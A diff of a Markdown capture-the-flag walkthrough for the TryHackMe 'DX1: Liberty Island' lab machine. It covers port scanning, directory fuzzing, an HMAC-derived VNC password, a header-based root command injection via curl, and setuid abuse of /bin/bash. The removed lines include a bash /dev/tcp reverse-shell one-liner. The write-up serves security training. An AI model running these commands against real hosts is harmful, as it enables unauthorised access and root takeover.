@@ -1,16 +1,22 @@
-**TryHackMe Target:  DX1: Liberty Island**
+**Target: 10.10.215.92 DX1-Liberty Island**
+(Machine was restarted in the middle of my work, so the target ip address for part of my work changed to 10.10.51.25)
 
 **Initial Access:**\
-nmap -Pn  10.10.215.92  -p- --min-rate=5000 	→ 	open ports are:  80, 5901, 23023
+nmap -Pn  10.10.215.92  -p- --min-rate=5000 |grep open|awk -F '/''{print $1}'|tr '\n' ','	\
+Output shows open ports:  80, 5901, 23023
 
-Let’s enumerate these ports further: \
-nmap -Pn  10.10.215.92  -p 80,5901,23023 --min-rate=5000 -sC -sV -oN nmap.txt\
-Output reveals:\
-port 80 is a website\
-port 5901 is VNC   \
-Port 23023 is a website
+Let’s enumerate these open ports further with nmap: \
+nmap -Pn  10.10.215.92  -p 80,5901,23023 --min-rate=5000 -sC -sV -oN nmap.txt \
+Output shows:
 
-Navigating to port 80 and looking around, there’s a link on the bottom called ‘War in Cyberspace’.  Clicking on that takes us to a directory  /badactors.html.  Shows a list that seems like it may be usernames or passwords.  Not much more to do here, so Let’s brute force directories on port 80:
+![image](https://user-images.githubusercontent.com/93153300/200068459-d6266a1c-d2d0-4f77-a3f5-6ba3f6eb276e.png)
+
+Navigate to port 80:
+
+![image](https://user-images.githubusercontent.com/93153300/200068681-74dd63f8-a48c-4087-9607-ba41151fd1b8.png)
+
+There’s a link on the bottom called ‘War in Cyberspace’. Clicking on that link takes us to a directory  /badactors.html.  \
+This directory shows a list that seems like it may be usernames or passwords.  Not much more to do here, so let's brute force directories on port 80:
 
 dirsearch -r -u http://10.10.215.92/ -e txt,php,html -f		→ Found directory: 	/robots.txt
 
@@ -18,139 +24,84 @@ Navigate to http://10.10.215.92/robots.txt  	→ 	Page reads: Disallow: /datacub
 
 Navigate to http://10.10.215.92/datacubes  	→ Automatically redirects to: http://10.10.215.92/datacubes/0000/ 
 
-Seeing the directory /0000/ seemed interesting. Perhaps has more hidden directories with different numbers. First, make a file with a list of numbers 0000-9999.  To create this list run: \
+Seeing the directory /0000/ seems interesting. Perhaps the target has more hidden directories with different numbers. Test this with the following steps:
+Step 1: Make a file with a list of numbers 0000-9999.  To create this list run command: \
 for i in {0000..9999};do echo $i >> nlist;done\
-Now that we have the file, we will fuzz this directory with: \
+Step 2: Fuzz the directory with command: \
 wfuzz -c -w nlist -u http://10.10.215.92/datacubes/FUZZ/  --hh 274\
 Output shows:
 
 ![image](https://user-images.githubusercontent.com/93153300/197628116-80ec4786-8cf6-405f-baed-4f31387c51da.png)
 
 
-
-
-
-So we found a few hidden directories, navigating to them one by one, we found http://10.10.215.92/datacubes/0451/		had interesting information.
+Wfuzz found a few hidden directories. Navigating to http://10.10.215.92/datacubes/0451/		shows:
 
 ![image](https://user-images.githubusercontent.com/93153300/197627629-912a147b-4a6c-46ee-8e95-8bd82dd96436.png)
 
+This message is telling us what user jacobson's password is for the vnc login. It says the password is the first 8 characters of the hash generated with hmac.  
 
-
- 
-
-
-
-
-Piecing this together, we see this is relate to vnc, we know from our nmap earlier that we have vnc port 5901 open.  We are also told here that the target is using hmac.  So googling hmac online calculator we navigate to the calculator on https://www.freeformatter.com/hmac-generator.html.   The input we need to calculate this is the string, secret key, and Digest algorithm.  
+Let's generate the hmac hash.  \
+Google search 'hmac online calculator'. There's plenty of hmac online calculators, we will use the hmac calculator found on https://www.freeformatter.com/hmac-generator.html.  
 
 ![image](https://user-images.githubusercontent.com/93153300/197627733-a4fcccd5-5d1b-417b-88cc-b197f684638a.png)
 
+This shows that the input we need in order to calculate the hmac hash is: the string, secret key, and Digest algorithm. These 3 pieces of information are given to us in the message.
 
+String= smashthestate \
+hmac hashing algorithm= md5 \
+Secret is not as simple, the message gives us clues that we have to piece together to figure out the secret.  
 
-
-
-
-
-These 3 pieces of information was given to us in the message above on http://10.10.215.92/datacubes/0451/.  The message tells us:\
-String= the username of the author of the message which he says is found on bad actors.  Looking back to our enumeration on port 80 we ran at the beginning, we found a directory /badactors.html and it looked like a list of usernames, so he is probably referring to that list.  Finally, the message shows the authors initials are JL.  Searching through the username list on /badactors.html, it seems like the list is usernames of first name last name, where the first name is only an initial of his first name.  
+The message says that the secret is the username of the author of the message.  We don't know his username, but the message says that we can find his username in a list called bad actors. 
+Earlier, when we enumerated port 80, we found a directory called /badactors.html and it looked like a list of usernames.  Look back at that list, as the message seems to be referring to that list: 
 
 ![image](https://user-images.githubusercontent.com/93153300/197627787-7e028e2a-73e1-484e-a372-ef24f25e9aaa.png)
 
+There are many names on this list, and we don't know which username is the correct one.  However, we can take an educated guess based on two pieces of information. 
+* 1. The message shows that the authors initials are 'JL'.\
+* 2. Looking over the list on /badactors.html, it seems like the usernames consist of first name last name, where the first name is only an initial of his first name. 
 
-
-
-
-
-
-
-
-
+Based on this, jlebedev seems to be the secret.  \
+Now that we have the string, secret, and the hmac hashing algorithm, let's run the hmac converter.
+The hmac converter produces: 311781a1830c1332a903920a59eb6d7a
  
-
-Based on that, jlebedev seems to be the best fit for the authors username.  \
-String= smashthestate\
-Secret=  jlebedev\
-hmac hashing algorithm= md5
-
-Filling this out, the computed hmac is: 311781a1830c1332a903920a59eb6d7a
- 
-The message tells us his password is the first 8 letters: 311781a1\
-Now we have a username and password, let’s log in to vnc with:\
-vncviewer  10.10.215.92:5901   → when it prompts for password enter: 	311781a1   → and we are in as user ajacobson.
+The message tells us his password is the first 8 letters of the hash: 311781a1 \
+Now that we have a username and password, log in to vnc with command:\
+vncviewer  10.10.215.92:5901   → when it prompts for password enter: 	311781a1\
+Vnc opens a gui as user ajacobson.  Open user.txt to get the first flag.
 
 ![image](https://user-images.githubusercontent.com/93153300/197627944-85fd8bb9-caf4-4526-bb3c-57fb9d390f82.png)
-
-
-
-
-
-
-  
-
-
-
-
-
-Open user.txt and we get the first flag.
 ___________________________________________________________________
 **Privilege Escalation:**\
-After some manual enumeration and running linpeas, there wasn’t much found.  Going back to the desktop, there’s a file called badactors-list.  Opening that file we see it loads and then show a list:
-
-
-
-
-
-
+Manual enumeration and running linpeas didn't find anything of interest.  Going back to the desktop, there’s a file called badactors-list.  Opening that file we see it starts by connecting to http://UNATCO:23023:
 
 ![image](https://user-images.githubusercontent.com/93153300/197628205-12266368-ba69-4bde-b63f-a7d07472f5fe.png) 
 
-![image](https://user-images.githubusercontent.com/93153300/197628240-0a83c5c2-677f-4d49-924a-1dc68644f25e.png)
-
-In the first screen, when it’s loading it shows it’s connecting to port 23023, which we saw earlier from nmap that it’s an open port.  So let’s navigate to that page.  To be able to load that page,   we need to put into /etc/hosts  10.10.215.92   UNATCO.   Navigating to that page we get:
+We know from our initial nmap scan that port 23023 is open to the public. Before going to port 23023, add into /etc/hosts: 10.10.215.92 UNATCO.   Navigating to http://UNATCO:23023 shows:
 
 ![image](https://user-images.githubusercontent.com/93153300/197628453-e25f9bc2-2f07-4500-b822-15bb70ea8626.png)
  
+Not much we can do here, so open tcpdump to listen to this file badactors-list and see if anything interesting shows up when we run the file.  The target shell won’t let us use tcpdump, so download the file to our pc and then we will run tcpdump on locally on the file.  \
+To donwload the file:
+Step 1: From the target gui, open a terminal
+Step 2: Go to the directory where the file badactors-list is located: python3 -m http.server 8000\
+Step 3: On our pc run command  →   wget http://10.10.215.92:8000/badactors-list
 
-
-
-
-Not much we can do here, so open tcpdump to listen to this file badactors-list and see if anything interesting shows up when we run the file.  The target shell won’t let us use tcpdump, so download the file to our pc and then we will run tcpdump on it.  \
-On target open python server in directory where this file is located: python3 -m http.server 8000\
-On our pc: wget http://10.10.215.92:8000/badactors-list
-
-Now that we have the file on our pc, make the file an executable: \
-chmod +x badactors-list.  \
-Next, run tcpdump listener: tcpdump -A -i tun0 port 23023\
-Now, run badactors-list:    ./badactors-list\
+Now that we have the file on our pc, make the file an executable with command: chmod +x badactors-list. \
+Next, run tcpdump listener with command: tcpdump -A -i tun0 port 23023 \
+Finally, run badactors-list:    ./badactors-list\
 tcpdump captures some interesting information:
 
 ![image](https://user-images.githubusercontent.com/93153300/197628500-f7735841-2353-427e-95a1-944d263ad58e.png)
-
-
- 
-
-
-
 
 The ‘Clearance-Code’ header is very unusual, and ‘directive=’  seems to run commands.  
 Let’s try to use this to run commands:    \
 curl http://10.10.215.92:23023 -H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" -d "directive=whoami"   → we get a response: root.    This shows we have remote command execution as root.
 
-Let’s change /bin/bash to be a suid, and then we’ll be able to escalate to root.  We can do this by running command:\
+Use this to change '/bin/bash' on the target to have suid permissions.  We can do this by running command:\
 curl http://10.10.215.92:23023 -H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" -d "directive=chmod 4755 /bin/bash"
 
-To be able to run /bin/bash -p, we will run it from our pc.  So on our pc run: pwncat-cs -lp 443 (can do this just as well with netcat -lvnp 443), on target pc run: bash -c 'bash -i >& /dev/tcp/10.2.1.148/443 0>&1'
-nc listener got a hit and now has shell running. Finally, run:\
-/bin/bash -p
+Go back to the vnc gui we have on ajacobson.  Open a terminal and run command: /bin/bash -p \
+We now have shell as root, open root.txt to get the flag.
 
-![image](https://user-images.githubusercontent.com/93153300/197628590-63e59f52-873f-4df9-a3b3-b8206f361907.png)
-
-
-
-
-
-
-
-We have shell as root, open root.txt to get the flag.
-
+![image](https://user-images.githubusercontent.com/93153300/200085771-bd4c8159-6dbf-4761-ae0b-7e68c647f7d0.png)
 
